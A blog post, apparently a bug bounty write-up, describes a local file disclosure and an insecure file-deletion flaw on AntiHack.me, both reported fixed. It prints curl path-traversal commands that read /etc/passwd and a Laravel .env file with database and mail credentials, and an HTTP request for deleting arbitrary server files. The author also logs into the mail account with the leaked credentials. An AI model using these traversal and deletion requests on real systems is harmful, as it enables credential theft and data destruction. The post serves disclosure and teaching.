---
layout: post
title: How I Found Multiple Vulnerabilities on AntiHack.Me
excerpt: "AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creating an account, the user will be provided with information regarding the Bug Bounty Program found at AntiHack, and the AntiHack site itself is included in the program."
tags: [bug hunting, hacking, lfi, lfd]
categories: [bug hunting]
comments: true
image:
  feature: c943919f00e9a4a7cd67a30b257c3ea1-f.png
---

AntiHack.me is a Singaporean Bug Bounty Platform site. After seeing this platform well known, I decided to create an account there. After successfully creating an account, the user will be provided with information regarding the Bug Bounty Program found at AntiHack, and the AntiHack site itself is included in the program.

#### VULNERABILITY I (Local File Disclosure)

When accessing the https://www.antihack.me/blog page, the website will display Popup Modal which contains an invitation to subscribe to AntiHack Magazine, which is an E-Zine made by them. The process is by entering some information in the field provided, then pressing the Submit button. After the Submit button is pressed, the user will be directed to the link to download the E-Zine. Following is the form of the link:

```
https://www.antihack.me/filedownload.php?file=AntiHACKJan19Issue.pdf
```

From this structure, it can be seen that the file `filedownload.php` may have a Local File Disclosure vulnerability, where by using this file, we can download sensitive files that are on the server. I tried using curl like this:

```
[root@noobe.io ~]# curl https://www.antihack.me/filedownload.php?file=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
```

It can be seen that the file `filedownload.php` really has a vulnerability so we can download files on the server. Because the AntiHack.me website uses Laravel, then I try to get the config file, which is in the `.env` file.

```
[root@noobe.io ~]# curl https://www.antihack.me/filedownload.php?file=../../../../var/www/html/.env

DB_CONNECTION=mysql
DB_HOST=localhost
DB_PORT=3306
DB_DATABASE=antihack
DB_USERNAME=antihack
DB_PASSWORD=

MAIL_DRIVER=smtp
MAIL_HOST=smtp.zoho.com
MAIL_PORT=465
MAIL_USERNAME=admin@antihack.me
MAIL_PASSWORD=[ redacted ]
```

From this information, I obtain sensitive information such as user and database passwords. There is even an SMTP user and password used. I tried logging in using the SMTP user and password obtained and it's worked XD.

![AntiHack.Me Zoho Account](/assets/c943919f00e9a4a7cd67a30b257c3ea1-1.png)


#### VULNERABILITY II (IDOR Delete Any File on AntiHack.me Server)

As on other Bug Bounty websites, there is a feature for reporting vulnerability found. There is also an attach file feature to add image or video files to complete the report that we send. After finishing uploading the file on the report form, an X button appears which serves to delete the file that was just uploaded, of course the function is to delete the file if we incorrectly upload the report file.

![AntiHack.Me Delete File Button](/assets/c943919f00e9a4a7cd67a30b257c3ea1-2.png)

When the button is clicked, the process runs like this:

```
POST /php/ajax_remove_file.php HTTP/1.1
Host: www.antihack.me
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.antihack.me/hacker_inbox
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 21
Cookie: [ redacted ]
Connection: close

file=35C2XxQY_400x400.png
```

Unfortunately there is no validation of any files that may be deleted. By manipulating the values of the `file` parameters we can delete any files contained on the AntiHack.me server.

For more details, please see the following GIF:

![AntiHack.Me Delete File GIF](/assets/c943919f00e9a4a7cd67a30b257c3ea1-3.gif)

In my trial I tried to delete files with several different extensions, but I did not try to delete files outside the website folder because I was worried that they might interfere and even damage the website.

Those are some of the vulnerabilities that were found on the Anti Hack.me website. Currently all of these vulnerabilities have been fixed by AntiHack.me.

#### Timeline

```
2019-01-03: Bug reported
2019-01-04: Triaged
2019-01-06: Bug Fixed
2019-01-09: Report Resolved
2019-01-09: Swag Rewarded
```

**References:**

- CWE-200 : Information Exposure
- CWE-284: Improper Access Control